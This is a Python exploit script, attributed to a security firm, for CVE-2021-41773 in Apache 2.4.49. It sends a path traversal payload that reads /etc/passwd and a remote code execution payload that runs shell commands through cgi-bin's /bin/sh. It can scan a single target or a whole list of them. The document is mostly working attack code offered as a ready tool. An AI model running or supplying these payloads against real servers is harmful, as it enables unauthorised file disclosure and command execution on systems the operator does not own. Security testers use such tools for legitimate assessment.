#!/usr/bin/python

import os
import sys
import requests
import argparse
import urllib
from os import path

#User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

#Usage Instructions
usage = "\n- cve-2021-41773.py -u domain.com\n- cve-2021-41773.py -u domain.com -l ip.txt -w wordlist\n- cve-2021-41773.py -u domain.com -l ip.txt -w wordlist"
description = "cve-2021-41773.py is a automated tool to exploit Path Traversal or Remote Code Execution vulnerability in Apache 2.4.49"

#Arguments Parser
parser = argparse.ArgumentParser(usage=usage, description=description)
parser.add_argument("-u", dest="url", type=str, help="Specify a domain/ip to scan for CVE-2021-41773.")
parser.add_argument("-w", dest="wordlist", help="Specify a custom wordlist file for directory search.")
parser.add_argument("-pt", dest="pt", action="store_true", help="This will exploit only Path Traversal vulnerability.")
parser.add_argument("-rce", dest="rce", action="store_true", help="This will exploit only Remote Code Execution vulnerability.")
parser.add_argument("-l", dest="list", help="Specify a file to bulk scan for CVE-2021-41773.")
args = parser.parse_args()

def banner():
	print("******************************************************************************")
	print("*   _______    ________    ___   ____ ___  ___      __ __ __________________ *")
	print("*  / ____/ |  / / ____/   |__ \ / __ \__ \<  /     / // /<  /__  /__  /__  / *")
	print("* / /    | | / / __/________/ // / / /_/ // /_____/ // /_/ /  / /  / / /_ <  *")
	print("*/ /___  | |/ / /__/_____/ __// /_/ / __// /_____/__  __/ /  / /  / /___/ /  *")
	print("*\____/  |___/_____/    /____/\____/____/_/        /_/ /_/  /_/  /_//____/   *")
	print("*                                                                            *")
	print("*       Developed By: @nirav4peace | Walnut Security Services Pvt. Ltd.      *")
	print("*                                                                            *")
	print("******************************************************************************")
banner()

#Check for valid URL format and connectivity
def urlCheck(url):
    try:
        try:
            try:
                try:
                    try:
                    	resp = requests.get(url, headers={"User-Agent": user_agent})
                    except requests.exceptions.InvalidURL:
                    	print ("\n[-] Provided URL is invalid. Please specify valid URL.\n")
                    	sys.exit()
                except requests.exceptions.InvalidSchema:
                    print ("\n[-] You have provided wrong protocol in "+url+", it must be (http:// or https://)\n")
                    sys.exit()
            except requests.exceptions.MissingSchema:
                print ("\n[-] You need to specify protocol (http:// or https://) in "+url+"\n")
                sys.exit()
        except requests.exceptions.ReadTimeout:
            print ("\n[-] Server has not responded within 10s for the domain "+url+"\n")
            sys.exit()
    except requests.exceptions.ConnectionError:
        print ("\n[-] Unable to connect to the domain "+url+"\n")
        sys.exit()

def pathTraversal(url):
	payload_pt = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	payload = url + urllib.parse.quote(payload_pt, safe="/%")
	print ("[+] Executing payload "+payload_pt)
	try:
		request = urllib.request.Request(payload, headers={"User-Agent": user_agent})
		response = urllib.request.urlopen(request)
		res = response.read().decode("utf-8")
		if "root:" in res:
			print ("[!] "+url+" is vulnerable to Path Traversal Attack")
			print ("[+] Response:")
			print (res)
	except urllib.error.HTTPError:
		print ("[!] Server is not vulnerable to CVE-2021-41773\n")
			
def RCE(url):
	payload_rce = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
	payload = url + urllib.parse.quote(payload_rce, safe="/%")
	data = "echo;id"
	data = data.encode("ascii")
	print ("[+] Executing payload "+payload_rce)
	try:
		request = urllib.request.Request(payload, data=data, headers={"User-Agent": user_agent})
		response = urllib.request.urlopen(request)
		res = response.read().decode("utf-8")
		if "uid=" in res:
			print ("[!] "+url+" is vulnerable to Remote Code Execution attack.")
			print ("[+] Response:")
			print (res)
		else:
			print ("[-] CGI-BIN directory on "+url+" does not have '+x' permission.")
	except urllib.error.HTTPError:
		print ("[!] "+url+" is not vulnerable to CVE-2021-41773\n")

def execute(url):
	urlCheck(url)
	ind=0
	if args.pt:
		pathTraversal(url)
		ind = 1
	if args.rce:
		RCE(url)
		ind = 1
	if ind == 0:
		pathTraversal(url)
		RCE(url)

if args.url and args.list:
	print("[-] Specify only one parameter '-u' or '-l'")
	
elif args.url:
	url = args.url
	execute(url)
	
elif args.list:
	if not os.path.exists(args.list):
		print ("\n[-] No such list found in the given path.\n")
		sys.exit()
	lists = open(args.list).read().splitlines()
	for url in lists:
		execute(url)
else:
	print("[-] No parameters given. Please see help by '-h'\n")
	sys.exit()